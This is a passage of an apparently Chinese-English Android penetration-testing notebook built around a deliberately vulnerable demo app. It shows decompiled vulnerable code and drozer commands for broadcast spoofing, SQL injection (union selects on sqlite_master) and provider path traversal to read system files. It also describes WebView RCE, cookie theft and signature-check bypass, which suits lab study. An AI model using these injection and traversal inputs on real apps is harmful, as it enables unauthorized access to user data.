intent.getStringExtra(<span class="string">&quot;operation&quot;</span>), intent.getStringExtra(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">performSensitiveOperation</span><span class="params">(Context context, String str, String str2)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;执行了操作: &quot;</span> + str + <span class="string">&quot;，数据: &quot;</span> + str2, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Send counterfeit messages to the broadcast</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --component com.asec.alan com.asec.alan.VulnerableReceiver --action com.asec.alan.ACTION_SENSITIVE_OPERATION --extra string operation &quot;viciousData1&quot; --extra string data &quot;viciousData2&quot;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924110021800.png" alt="image-20250924110021800"></p>
+</li>
+</ol>
+<h3 id="Provider"><a href="#Provider" class="headerlink" title="Provider"></a>Provider</h3><h4 id="Unauthorized-Access-3"><a href="#Unauthorized-Access-3" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content Provider 未限制访问权限，导致应用内敏感数据（如用户信息、数据库）可被任意读取。</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>Find out the attacksurface about com.asec.alan</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092722780.png" alt="image-20250924092722780"></p>
+</li>
+<li><p>Get the information about provider</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092955453.png" alt="image-20250924092955453"></p>
+</li>
+<li><p>Find uri of this provider</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094216723.png" alt="image-20250924094216723"></p>
+</li>
+<li><p>Query datas with uri</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094356414.png" alt="image-20250924094356414"></p>
+</li>
+</ol>
+<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><ol>
+<li><p>Find Sql Injection of the provider by running script</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924100755596.png" alt="image-20250924100755596"></p>
+</li>
+<li><p>Obtain the source code about ContentProvider through decompilation</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.ContentProvider;</span><br><span class="line"><span class="keyword">import</span> android.content.ContentValues;</span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.SQLException;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteOpenHelper;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.ParcelFileDescriptor;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableContentProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DB_NAME</span> <span class="operator">=</span> <span class="string">&quot;userdata.db&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DB_VERSION</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableProvider&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> SQLiteOpenHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">(Uri uri)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues contentValues)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues contentValues, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.dbHelper = <span class="keyword">new</span> <span class="title class_">SQLiteOpenHelper</span>(getContext(), DB_NAME, <span class="literal">null</span>, <span class="number">1</span>) &#123; <span class="comment">// from class: com.asec.alan.VulnerableContentProvider.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase sQLiteDatabase, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase sQLiteDatabase)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, &#x27;admin123&#x27;)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;user1&#x27;, &#x27;pass1&#x27;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        createTestFile();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createTestFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir(), <span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fileOutputStream.write(<span class="string">&quot;Vulnerable content for traversal test&quot;</span>.getBytes());</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;测试文件已创建：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;创建测试文件失败&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri uri, String str)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedPath</span> <span class="operator">=</span> uri.getEncodedPath();</span><br><span class="line">        <span class="keyword">if</span> (encodedPath.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            encodedPath = encodedPath.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir().getParentFile(), encodedPath);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;尝试访问文件：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file, <span class="number">268435456</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] strArr, String str, String[] strArr2, String str2)</span> &#123;</span><br><span class="line">        <span class="type">SQLiteDatabase</span> <span class="variable">readableDatabase</span> <span class="operator">=</span> <span class="built_in">this</span>.dbHelper.getReadableDatabase();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;SELECT * FROM users WHERE &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">            str = <span class="string">&quot;1=1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> readableDatabase.rawQuery(sb.append(str).toString(), <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SQL Inject: determine the number of columns</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 order by 10&quot;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924101320234.png" alt="image-20250924101320234"></p>
+</li>
+<li><p>SQL Inject: Determine some information about the database</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sqlite_version()&quot;</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sql from sqlite_master&quot;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102628867.png" alt="image-20250924102628867"></p>
+</li>
+<li><p>SQL Inject: Query data of other tables</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 11, 22, locale from android_metadata&quot;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102809532.png" alt="image-20250924102809532"></p>
+</li>
+</ol>
+<h4 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content Provider 的openFile()方法未验证文件路径，导致攻击者可访问应用沙盒外的任意文件</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>Scanner traversal vulnerbilities of provider</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.asec.alan</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103551392.png" alt="image-20250924103551392"></p>
+</li>
+<li><p>Read other files’ contents by traversal vulnerability</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.asec.alan.provider/../../../../../../../../../../../../../../../system/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103733116.png" alt="image-20250924103733116"></p>
+</li>
+</ol>
+<h2 id="Unsafe-Configuration"><a href="#Unsafe-Configuration" class="headerlink" title="Unsafe Configuration"></a>Unsafe Configuration</h2><h3 id="Allow-Backup"><a href="#Allow-Backup" class="headerlink" title="Allow Backup"></a>Allow Backup</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通讯录应用，一旦应用程序支持备份和恢复功能，攻击者即可通过 adb backup 和 adb restore 进行恢复新安装的同一个应用来查看聊天记录等信息</span><br><span class="line">支付金融类应用，攻击者可通过此来进行恶意支付、盗取存款等</span><br></pre></td></tr></table></figure>
+
+<h3 id="Debuggable"><a href="#Debuggable" class="headerlink" title="Debuggable"></a>Debuggable</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android:debuggable属性是指定应用程序是否能够被调试，即时是以用户模式运行在设备上的时候，如果设置为 true ，则能够被调试，否则不能调试，默认值是false</span><br><span class="line"></span><br><span class="line">逆向工作人员在对一个apk程序进行逆向时，第一步往往就是要对debuggable属性进行绕过，否则就不能进行正常的调试，因此如果属性本身设为true，更容易导致该应用存在动态调试，泄露数据信息的风险</span><br></pre></td></tr></table></figure>
+
+<h3 id="Information-Leakage"><a href="#Information-Leakage" class="headerlink" title="Information Leakage"></a>Information Leakage</h3><h4 id="LogCat输出敏感信息漏洞"><a href="#LogCat输出敏感信息漏洞" class="headerlink" title="LogCat输出敏感信息漏洞"></a>LogCat输出敏感信息漏洞</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息.</span><br><span class="line"></span><br><span class="line">应用层Log敏感信息输出</span><br><span class="line">应用层System.out.println敏感信息输出</span><br><span class="line">系统bug异常导致Log输出</span><br><span class="line">Native层敏感Log输出</span><br></pre></td></tr></table></figure>
+
+<h4 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一些开发人员，在开发时使用硬编码的方式，导致存在一定的安全风险，硬编码一般是指将输出或输入的相关参数以常量的方式编写在源代码中，这样导致逆向分析人员可以直接通过分析源码就可以获得敏感信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="Shared-Preference全局可读写漏洞"><a href="#Shared-Preference全局可读写漏洞" class="headerlink" title="Shared Preference全局可读写漏洞"></a>Shared Preference全局可读写漏洞</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shared Preferences存储安全风险在于：开发者在创建文件时没有正确的选择合适的创建模式（MODE_PRIVATE、MODE_WOELD_READABLE以及MODE_WORLD_WRITEABBLE）进行权限控制，导致将一些用户信息、密码等敏感信息存储在Shared Preferences文件中，攻击者可以通过root来查看敏感信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="SD卡读写"><a href="#SD卡读写" class="headerlink" title="SD卡读写"></a>SD卡读写</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在的手机很多的公共目录都是自身自带的存储空间，Android系统的文件一般都存储在sdCard和应用的私有目录下，任何在Android Manifest中声明读写sdcard权限的应用都可以对sdcard进行读写。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Unsafe-HTTP-s"><a href="#Unsafe-HTTP-s" class="headerlink" title="Unsafe HTTP&#x2F;s"></a>Unsafe HTTP&#x2F;s</h2><h3 id="Plaintext-Transmit"><a href="#Plaintext-Transmit" class="headerlink" title="Plaintext Transmit"></a>Plaintext Transmit</h3><h3 id="Lack-verification-of-certificate"><a href="#Lack-verification-of-certificate" class="headerlink" title="Lack verification of certificate"></a>Lack verification of certificate</h3><h3 id="Lack-verification-of-hostname"><a href="#Lack-verification-of-hostname" class="headerlink" title="Lack verification of hostname"></a>Lack verification of hostname</h3><h3 id="Bypass-certificate"><a href="#Bypass-certificate" class="headerlink" title="Bypass certificate"></a>Bypass certificate</h3><h2 id="Captcha"><a href="#Captcha" class="headerlink" title="Captcha"></a>Captcha</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证码暴力破解漏洞一般是因为用户使用手机号+验证码的方式进行登陆时，短信验证码一般由4-6位数字组成，而且APP并未对验证码做时间和失败次数校验，所以攻击者可以通过这个区间的所有数字进行暴力破解来进行攻击</span><br></pre></td></tr></table></figure>
+
+<h3 id="Interface-Abuse"><a href="#Interface-Abuse" class="headerlink" title="Interface Abuse"></a>Interface Abuse</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证码无限次数发送、短信轰炸漏洞一般是APP端并没有对手机号码进行次数显示，也未对访问进行时间限制</span><br></pre></td></tr></table></figure>
+
+<h3 id="Amnipotent-Captcha"><a href="#Amnipotent-Captcha" class="headerlink" title="Amnipotent Captcha"></a>Amnipotent Captcha</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 验证码执行【找回密码】操作时，输入手机号，获取验证码，服务器会向手机发送验证码，通过burpsuite抓包工具，查看返回的响应数据包中如果包含验证码，则可能导致用户密码恶意重置、绑定手机号被恶意更换等风险</span><br><span class="line">2. 万能验证码一般是开发在业务未上线的时候为了方便测试用的,上线后忘记删除了,例如[8888 0000 1234](tel:8888 0000 1234)等等</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在APP验证码测试过程中，我们发现很对APP并未对登录成功的响应报文进行校验，导致我们获取登录成功的响应报文后，就可以通过正确的响应报文实现任意号码的登录，导致信息泄露</span><br></pre></td></tr></table></figure>
+
+<h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</span><br><span class="line">（1）Android中的对象有一公共的方法：getClass() </span><br><span class="line">（2）该方法可以获取到当前类 类型Class</span><br><span class="line">（3）该类有一关键的方法： Class.forName；</span><br><span class="line">（4）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class="line">（5）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure>
+
+<h3 id="Plaintext-Strorage"><a href="#Plaintext-Strorage" class="headerlink" title="Plaintext Strorage"></a>Plaintext Strorage</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入密码时，会弹出提示框：询问用户是否保存密码；如果选择”是”，密码会被明文保到 /data/data/com.package.name/databases/webview.db 中</span><br></pre></td></tr></table></figure>
+
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</span><br><span class="line">这样使得WebView可以使用File协议，和加载Js代码读取本地文件，或访问http源，这样会导致攻击者操作用户点击后无感知下载恶意的HTML/JS，并窃取相关的私有文件信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="任意界面注入"><a href="#任意界面注入" class="headerlink" title="任意界面注入"></a>任意界面注入</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</span><br><span class="line">用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cookie盗用"><a href="#Cookie盗用" class="headerlink" title="Cookie盗用"></a>Cookie盗用</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike</span><br></pre></td></tr></table></figure>
+
+<h3 id="Launch-Any-Where"><a href="#Launch-Any-Where" class="headerlink" title="Launch Any Where"></a>Launch Any Where</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起launchAnyWhere漏洞</span><br></pre></td></tr></table></figure>
+
+<h3 id="DeepLink-RCE"><a href="#DeepLink-RCE" class="headerlink" title="DeepLink_RCE"></a>DeepLink_RCE</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞</span><br></pre></td></tr></table></figure>
+
+<h3 id="WebView-loadDataWithBaseURL"><a href="#WebView-loadDataWithBaseURL" class="headerlink" title="WebView loadDataWithBaseURL"></a>WebView loadDataWithBaseURL</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当loadDataWithBaseURL的域名和内容同时可控是，可以构造任意域下的XSS;通过恶意的deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！</span><br></pre></td></tr></table></figure>
+
+<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="不安全的动态加载"><a href="#不安全的动态加载" class="headerlink" title="不安全的动态加载"></a>不安全的动态加载</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android系统提供类加载器DexClassLoader，可以在运行时动态加载执行包含的JAR或APK文件内的DEX文件，这样可能导致所加载的Dex文件被恶意应用替换或代码注入，如果不对Dex文件进行签名校验，就可能导致加载的是恶意代码，这样就会进一步造成严重危害</span><br></pre></td></tr></table></figure>
+
+<h3 id="签名绕过"><a href="#签名绕过" class="headerlink" title="签名绕过"></a>签名绕过</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">java层的签名校验：</span><br><span class="line">原理：这种是开发者在APK java层中加入了签名校验代码，然后通过校验加入文件的MD5值或者SHA1值来对文件进行校验</span><br><span class="line">解决方案：一般这种情况，我们通过定位到APK中的签名代码段，然后进行hook 篡改或者进行修改后重打包就可以进行绕过</span><br><span class="line">so层的签名校验：</span><br><span class="line">原理：由于java可解释语言的原因，所以后来开发者又将签名代码放入so层，从而增加逆向工作的难度</span><br><span class="line">解决方案：这种情况，同样可以使用IDA或GDB进行动态调试确定到签名代码段，然后使用hook 注入技术或静态修改来进行绕过</span><br><span class="line">在线签名校验：</span><br><span class="line">原理：由于前两种方式都是静态校验的方式，这样的安全性仍然较低，后来更多厂商通过服务器在线进行验证，将签名密钥发送然后在so层或java层中进行校验</span><br><span class="line">解决方案：这种情况，我们要使用抓包软件对服务器发送的数据包进行抓取，在成功获取正确密钥后，再去hook对应的签名代码段，从而就可以实现绕过</span><br></pre></td></tr></table></figure>
+
+<h3 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为Linux系统中../代表向上级目录跳转，攻击者可以通过构造相应的Zip文件，利用多个&#x27;../&#x27;从而改变zip包中某个文件的存放位置，费用该替换掉应用原有的文件，完成目录穿越。这样严重可能会导致任意代码执行漏洞，危害应用用户的设备安全和信息安全</span><br><span class="line"></span><br><span class="line">Java 代码在解压 zip 文件时，会使用到 ZipEntry 类的 getName() 方法，如果 zip 文件中包含 ../ 的字符串，该方法返回值会原样返回。如果没有过滤掉 getName() 返回值中的 ../ 字符串，继续解压缩操作，就会在其他目录中创建解压的文件</span><br></pre></td></tr></table></figure>
+
+
+
+
+
